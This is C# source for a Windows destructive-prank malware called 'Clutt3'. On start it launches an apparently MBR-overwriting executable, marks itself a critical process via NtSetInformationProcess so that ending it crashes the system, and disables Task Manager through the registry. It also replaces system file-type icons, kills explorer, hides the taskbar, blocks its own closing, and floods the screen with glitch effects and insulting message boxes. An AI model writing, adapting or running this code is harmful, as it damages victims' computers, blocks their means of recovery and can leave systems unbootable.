﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Media;
using System.IO;

namespace Clutt3
{
    public partial class Clutt3_Icon : Form
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private SoundPlayer _soundplayer3, _soundplayer4, _soundplayer5, _soundplayer6, _soundplayer7;

        string sound_file3 = @"C:\Windows\Media\Windows Notify.wav";
        string sound_file4 = @"C:\Windows\Media\Windows Error.wav";
        string sound_file5 = @"C:\Program Files\xp_snd.wav";
        string sound_file6 = @"C:\Windows\Media\Windows User Account Control.wav";
        string sound_file7 = @"C:\Windows\Media\chord.wav";

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        [DllImport("user32.dll")]
        public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

        [DllImport("user32.dll")]
        private static extern int GetDesktopWindow();

        private const int SW_HIDE = 0;

        public Clutt3_Icon()
        {
            InitializeComponent();
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            if (File.Exists(sound_file3))
            {
                _soundplayer3 = new SoundPlayer("C:\\Windows\\Media\\Windows Default.wav");
            }

            if (File.Exists(sound_file4))
            {
                _soundplayer4 = new SoundPlayer("C:\\Windows\\Media\\Windows Error.wav");
            }

            if (File.Exists(sound_file5))
            {
                _soundplayer5 = new SoundPlayer("C:\\Program Files\\xp_snd.wav");
            }

            if (File.Exists(sound_file6))
            {
                _soundplayer6 = new SoundPlayer("C:\\Windows\\Media\\Windows User Account Control.wav");
            }

            if (File.Exists(sound_file7))
            {
                _soundplayer7 = new SoundPlayer("C:\\Windows\\Media\\chord.wav");
            }

            this.TransparencyKey = this.BackColor;
        }

        protected static int Handle
        {
            get
            {
                return FindWindow("Shell_TrayWnd", "");
            }
        }

        protected static int HandleOfStartButton
        {
            get
            {
                int handleOfDesktop = GetDesktopWindow();
                int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                return handleOfStartButton;
            }
        }

        private void Clutt3_Icon_Load(object sender, EventArgs e)
        {
            Process.Start("C:\\Program Files\\MBR.exe");
            int processInformation = 1;
            int processInformationClass = 29;
            Process.EnterDebugMode();
            Clutt3_Icon.NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
            Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object)1, RegistryValueKind.String);
            RegistryKey subKey1 = Registry.ClassesRoot.CreateSubKey("exefile\\DefaultIcon");
            subKey1.SetValue("", (object)"C:\\Program Files\\clutt3-ico.ico");
            subKey1.Close();
            RegistryKey subKey2 = Registry.ClassesRoot.CreateSubKey("inifile\\DefaultIcon");
            subKey2.SetValue("", (object)"C:\\Program Files\\clutt3-ico.ico");
            subKey2.Close();
            RegistryKey subKey3 = Registry.ClassesRoot.CreateSubKey("dllfile\\DefaultIcon");
            subKey3.SetValue("", (object)"C:\\Program Files\\clutt3-ico.ico");
            subKey3.Close();
            RegistryKey subKey4 = Registry.ClassesRoot.CreateSubKey("txtfile\\DefaultIcon");
            subKey4.SetValue("", (object)"C:\\Program Files\\clutt3-ico.ico");
            subKey4.Close();
            RegistryKey subKey5 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons");
            subKey5.SetValue("clutt3", (object)"C:\\Program Files\\clutt3-ico.ico");
            subKey5.Close();
            this.timer1.Start();
            this.timer2.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            Hide_Panel();
            timer3.Start();
            
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            this.timer2.Stop();
            Process process = Process.GetProcessesByName("explorer")[0];
            process.Kill();
            Process.Start(process.MainModule.FileName);
        }

        public static void Hide_Panel()
        {
            ShowWindow(Handle, SW_HIDE);
            ShowWindow(HandleOfStartButton, SW_HIDE);
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Stop();
            timer5.Start();
            error_sound();


        }

        private void error_sound()
        {
            _soundplayer5.PlayLooping();
        }

        Random r;

        private void timer5_Tick(object sender, EventArgs e)
        {
            timer5.Stop();
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            var screen = System.Windows.Forms.Screen.PrimaryScreen;
            var rect = screen.Bounds;
            var size = rect.Size;
            Bitmap bmpScreenshot = new Bitmap(size.Width, size.Height);
            g = this.CreateGraphics();
            g = Graphics.FromImage(bmpScreenshot);
            g.CopyFromScreen(0, 0, 0, 0, size);
            pictureBox1.Image = bmpScreenshot;

            timer6.Start();
            timer8.Start();
        }

        Graphics g;
        int payload = 0;

        private void timer6_Tick(object sender, EventArgs e)
        {
            if(payload == 0)
            {
                r = new Random();
                int true_num = r.Next(5);

                timer6.Stop();
                pictureBox1.Visible = true;
                if (true_num == 1)
                {


                    Bitmap pic = new Bitmap(pictureBox1.Image);
                    pictureBox1.Image = pic;

                    for (int y = 0; (y <= (pic.Height - 1)); y++)
                    {
                        for (int x = 0; (x <= (pic.Width - 1)); x++)
                        {
                            Color inv = pic.GetPixel(x, y);
                            inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                            pic.SetPixel(x, y, inv);
                        }
                    }
                }

                if (true_num == 2)
                {


                    Bitmap pic = new Bitmap(pictureBox1.Image);
                    pictureBox1.Image = pic;

                    for (int y = 0; (y <= (pic.Height - 1)); y++)
                    {
                        for (int x = 0; (x <= (pic.Width - 1)); x++)
                        {
                            Color inv = pic.GetPixel(x, y);
                            inv = Color.FromArgb(255, (255 - inv.R), (0 + inv.G), (0 + inv.B));
                            pic.SetPixel(x, y, inv);
                        }
                    }
                }

                if (true_num == 3)
                {


                    Bitmap pic = new Bitmap(pictureBox1.Image);
                    pictureBox1.Image = pic;

                    for (int y = 0; (y <= (pic.Height - 1)); y++)
                    {
                        for (int x = 0; (x <= (pic.Width - 1)); x++)
                        {
                            Color inv = pic.GetPixel(x, y);
                            inv = Color.FromArgb(255, (0 + inv.R), (255 - inv.G), (0 + inv.B));
                            pic.SetPixel(x, y, inv);
                        }
                    }
                }

                if (true_num == 4)
                {


                    Bitmap pic = new Bitmap(pictureBox1.Image);
                    pictureBox1.Image = pic;

                    for (int y = 0; (y <= (pic.Height - 1)); y++)
                    {
                        for (int x = 0; (x <= (pic.Width - 1)); x++)
                        {
                            Color inv = pic.GetPixel(x, y);
                            inv = Color.FromArgb(255, (0 + inv.R), (0 + inv.G), (255 - inv.B));
                            pic.SetPixel(x, y, inv);
                        }
                    }
                }



                timer7.Start();
            }
            else
            {
                timer6.Stop();
                timer7.Stop();
            }
            
        }

        private void timer7_Tick(object sender, EventArgs e)
        {
            timer7.Stop();
            pictureBox1.Visible = false;
            timer6.Start();
        }

        private void timer8_Tick(object sender, EventArgs e)
        {
            timer8.Stop();
            timer6.Stop();
            timer7.Stop();
            payload = 1;
            pictureBox1.Visible = false;
            timer9.Start();
            timer10.Start();
        }

        int spam_boxes = 0;

        private void timer9_Tick(object sender, EventArgs e)
        {
            if(spam_boxes == 0)
            {
                timer9.Stop();
                int true_num = r.Next(10);
                timer9.Start();

                if (true_num == 1)
                {

                    MessageBox.Show("u stup1d", "Clutt3", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

                if (true_num == 2)
                {

                    MessageBox.Show("-100 b0bux", "Clutt3", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }

                if (true_num == 3)
                {

                    MessageBox.Show("ham burger", "Clutt3", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                if (true_num == 4)
                {

                    MessageBox.Show("pog", "Clutt3", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

                if (true_num == 5)
                {

                    MessageBox.Show("big kok", "Clutt3", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }

                if (true_num == 6)
                {

                    MessageBox.Show("clutt iz bett3r th4n memz", "Clutt3", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                if (true_num == 7)
                {

                    MessageBox.Show("windows is crap", "Clutt3", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                if (true_num == 8)
                {

                    MessageBox.Show("gav3 me 100 b0bux", "Clutt3", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                if (true_num == 9)
                {

                    MessageBox.Show("plz clean ur sisteM", "Clutt3", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                timer9.Stop();
            }
            



        }
        private void timer10_Tick(object sender, EventArgs e)
        {
            timer10.Stop();
            spam_boxes = 1;
            timer11.Start();
            timer12.Start();

        }

        [DllImport("User32.dll")]
        static extern IntPtr GetDC(IntPtr hwnd);

        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

        int spam_icon = 0;

        private void timer11_Tick(object sender, EventArgs e)
        {
            if(spam_icon == 0)
            {
                timer11.Stop();
                r = new Random();
                Bitmap bitmap = new Bitmap(pictureBox2.Image);
                Bitmap bitmap2 = new Bitmap(pictureBox3.Image);
                Bitmap bitmap3 = new Bitmap(pictureBox4.Image);
                Bitmap bitmap4 = new Bitmap(pictureBox5.Image);
                Bitmap bitmap5 = new Bitmap(pictureBox6.Image);

                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawImage(bitmap, r.Next(-0, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(-10, Screen.PrimaryScreen.Bounds.Height));
                }

                IntPtr desktop2 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop2))
                {
                    g.DrawImage(bitmap2, r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(0, Screen.PrimaryScreen.Bounds.Height));
                }

                IntPtr desktop3 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop3))
                {
                    g.DrawImage(bitmap3, r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(0, Screen.PrimaryScreen.Bounds.Height));
                }

                IntPtr desktop4 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop4))
                {
                    g.DrawImage(bitmap4, r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(0, Screen.PrimaryScreen.Bounds.Height));
                }

                IntPtr desktop5 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop5))
                {
                    g.DrawImage(bitmap5, r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(0, Screen.PrimaryScreen.Bounds.Height));
                }
                timer11.Start();
            }
            else
            {
                timer11.Stop();
            }
            
        }

        int shake_screen = 0;

        private void timer12_Tick(object sender, EventArgs e)
        {
            timer12.Stop();
            pictureBox7.Visible = true;
            pictureBox8.Visible = true;
            spam_icon = 1;
            var screen = System.Windows.Forms.Screen.PrimaryScreen;
            var rect = screen.Bounds;
            var size = rect.Size;
            Bitmap bmpScreenshot = new Bitmap(size.Width, size.Height);
            g = this.CreateGraphics();
            g = Graphics.FromImage(bmpScreenshot);
            g.CopyFromScreen(0, 0, 0, 0, size);
            pictureBox7.Image = bmpScreenshot;
            pictureBox8.Image = bmpScreenshot;
            timer13.Start();
            timer15.Start();
        }
        private void timer13_Tick(object sender, EventArgs e)
        {
            if(shake_screen == 0)
            {
                timer13.Stop();
                Bitmap pic = new Bitmap(pictureBox7.Image);
                pictureBox7.Image = pic;
                pic.RotateFlip(RotateFlipType.RotateNoneFlipNone);
                timer14.Start();
            }
            else
            {
                timer13.Stop();
                timer14.Stop();
            }
            
        }

        private void timer14_Tick(object sender, EventArgs e)
        {
            if (shake_screen == 0)
            {
                timer14.Stop();
                Bitmap pic = new Bitmap(pictureBox8.Image);
                pictureBox8.Image = pic;
                pic.RotateFlip(RotateFlipType.Rotate180FlipY);
                timer13.Start();
            }
            else
            {
                timer13.Stop();
                timer14.Stop();
            }
        }

        private void timer15_Tick(object sender, EventArgs e)
        {
            timer15.Stop();
            shake_screen = 1;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            timer16.Start();
            timer17.Start();
            timer18.Start();
            timer19.Start();
            timer20.Start();
            timer21.Start();
        }

        Bitmap bmp;

        int last_payload = 0;

        private void timer16_Tick(object sender, EventArgs e)
        {
            if(last_payload == 0)
            {
                timer16.Stop();
                r = new Random();
                var endWidth = r.Next(50, 1000);
                var endHeight = r.Next(50, 1000);

                var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider

                var startWidth = endWidth / scaleFactor;
                var startHeight = endHeight / scaleFactor;

                bmp = new Bitmap(startWidth, startHeight);

                g = this.CreateGraphics();
                g = Graphics.FromImage(bmp);

                var xPos = Math.Min(0, MousePosition.X - (startWidth / r.Next(50, 1000))); // divide by two in order to center
                var yPos = Math.Min(0, MousePosition.Y - (startHeight / r.Next(50, 1000)));

                g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));

                for (int y = 0; (y <= (bmp.Height - 1)); y++)
                {
                    for (int x = 0; (x <= (bmp.Width - 1)); x++)
                    {
                        Color inv = bmp.GetPixel(x, y);
                        inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                        bmp.SetPixel(x, y, inv);
                    }
                }

                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawImage(bmp, r.Next(-100, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(-100, Screen.PrimaryScreen.Bounds.Height));
                }
                ReleaseDC(IntPtr.Zero, desktop);
                timer16.Start();
            }
            else
            {
                timer22.Stop();
                timer16.Stop();
                timer17.Stop();
                timer18.Stop();
                timer19.Stop();
                timer20.Stop();
            }


        }

        private void timer17_Tick(object sender, EventArgs e)
        {
            if(last_payload == 0)
            {
                timer17.Stop();
                r = new Random();
                var endWidth = r.Next(50, 1000);
                var endHeight = r.Next(50, 1000);

                var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider

                var startWidth = endWidth / scaleFactor;
                var startHeight = endHeight / scaleFactor;

                bmp = new Bitmap(startWidth, startHeight);

                g = this.CreateGraphics();
                g = Graphics.FromImage(bmp);

                var xPos = Math.Min(0, MousePosition.X - (startWidth / r.Next(50, 1000))); // divide by two in order to center
                var yPos = Math.Min(0, MousePosition.Y - (startHeight / r.Next(50, 1000)));

                g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));

                for (int y = 0; (y <= (bmp.Height - 1)); y++)
                {
                    for (int x = 0; (x <= (bmp.Width - 1)); x++)
                    {
                        Color inv = bmp.GetPixel(x, y);
                        inv = Color.FromArgb(255, (255 - inv.R), (0 + inv.G), (0 + inv.B));
                        bmp.SetPixel(x, y, inv);
                    }
                }

                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawImage(bmp, r.Next(-100, Screen.PrimaryScreen.Bounds.Width),
                    r.Next(-100, Screen.PrimaryScreen.Bounds.Height));
                }
                ReleaseDC(IntPtr.Zero, desktop);
                timer17.Start();
            }
            else
            {
                timer22.Stop();
                timer16.Stop();
                timer17.Stop();
                timer18.Stop();
                timer19.Stop();
                timer20.Stop();
            }

        }

        private void timer18_Tick(object sender, EventArgs e)
        {
            if(last_payload == 0)
            {
                timer18.Stop();
                r = new Random();
                var endWidth = r.Next(50, 1000);
                var endHeight = r.Next(50, 1000);

                var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider

                var startWidth = endWidth / scaleFactor;
                var startHeight = endHeight / scaleFactor;

                bmp = new Bitmap(startWidth, startHeight);

                g = this.CreateGraphics();
                g = Graphics.FromImage(bmp);

                var xPos = Math.Min(0, MousePosition.X - (startWidth / r.Next(50, 1000))); // divide by two in order to center
                var yPos = Math.Min(0, MousePosition.Y - (startHeight / r.Next(50, 1000)));

                g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));

                for (int y = 0; (y <= (bmp.Height - 1)); y++)
                {
                    for (int x = 0; (x <= (bmp.Width - 1)); x++)
                    {
                        Color inv = bmp.GetPixel(x, y);
                        inv = Color.FromArgb(255, (0 + inv.R), (255 - inv.G), (0 + inv.B));
                        bmp.SetPixel(x, y, inv);
                    }
                }

                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawImage(bmp, r.Next(-100, Screen.PrimaryScreen.Bounds.Width),
                    r.Next(-100, Screen.PrimaryScreen.Bounds.Height));
                }
                ReleaseDC(IntPtr.Zero, desktop);
                timer18.Start();
            }
            else
            {
                timer22.Stop();
                timer16.Stop();
                timer17.Stop();
                timer18.Stop();
                timer19.Stop();
                timer20.Stop();
            }

        }

        private void Clutt3_Icon_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void timer19_Tick(object sender, EventArgs e)
        {
            if(last_payload == 0)
            {
                timer19.Stop();
                r = new Random();
                var endWidth = r.Next(50, 1000);
                var endHeight = r.Next(50, 1000);

                var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider

                var startWidth = endWidth / scaleFactor;
                var startHeight = endHeight / scaleFactor;

                bmp = new Bitmap(startWidth, startHeight);

                g = this.CreateGraphics();
                g = Graphics.FromImage(bmp);

                var xPos = Math.Min(0, MousePosition.X - (startWidth / r.Next(50, 1000))); // divide by two in order to center
                var yPos = Math.Min(0, MousePosition.Y - (startHeight / r.Next(50, 1000)));

                g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));

                for (int y = 0; (y <= (bmp.Height - 1)); y++)
                {
                    for (int x = 0; (x <= (bmp.Width - 1)); x++)
                    {
                        Color inv = bmp.GetPixel(x, y);
                        inv = Color.FromArgb(255, (0 + inv.R), (0 + inv.G), (255 - inv.B));
                        bmp.SetPixel(x, y, inv);
                    }
                }

                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawImage(bmp, r.Next(-100, Screen.PrimaryScreen.Bounds.Width),
                    r.Next(-100, Screen.PrimaryScreen.Bounds.Height));
                }
                ReleaseDC(IntPtr.Zero, desktop);
                timer19.Start();
            }
            else
            {
                timer22.Stop();
                timer16.Stop();
                timer17.Stop();
                timer18.Stop();
                timer19.Stop();
                timer20.Stop();
            }

        }

        private void timer20_Tick(object sender, EventArgs e)
        {
            if(last_payload == 0)
            {
                timer20.Stop();

                r = new Random();
                var endWidth = r.Next(50, 1000);
                var endHeight = r.Next(50, 1000);

                var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider

                var startWidth = endWidth / scaleFactor;
                var startHeight = endHeight / scaleFactor;

                bmp = new Bitmap(startWidth, startHeight);

                g = this.CreateGraphics();
                g = Graphics.FromImage(bmp);

                var xPos = Math.Min(0, MousePosition.X - (startWidth / r.Next(50, 1000))); // divide by two in order to center
                var yPos = Math.Min(0, MousePosition.Y - (startHeight / r.Next(50, 1000)));

                g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));

                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawImage(bmp, r.Next(-100, Screen.PrimaryScreen.Bounds.Width),
                    r.Next(-100, Screen.PrimaryScreen.Bounds.Height));
                }
                ReleaseDC(IntPtr.Zero, desktop);

                timer20.Start();
            }
            else
            {
                timer22.Stop();
                timer16.Stop();
                timer17.Stop();
                timer18.Stop();
                timer19.Stop();
                timer20.Stop();
            }

        }

        private void timer21_Tick(object sender, EventArgs e)
        {
            timer21.Stop();            
            timer22.Start();
        }

        private void timer22_Tick(object sender, EventArgs e)
        {
            if(last_payload == 0)
            {
                timer22.Stop();
                timer16.Start();
                timer17.Start();
                timer18.Start();
                timer19.Start();
                timer20.Start();
                timer22.Start();
            }
            else
            {
                timer22.Stop();
                timer16.Stop();
                timer17.Stop();
                timer18.Stop();
                timer19.Stop();
                timer20.Stop();
            }
            
        }
    }
}
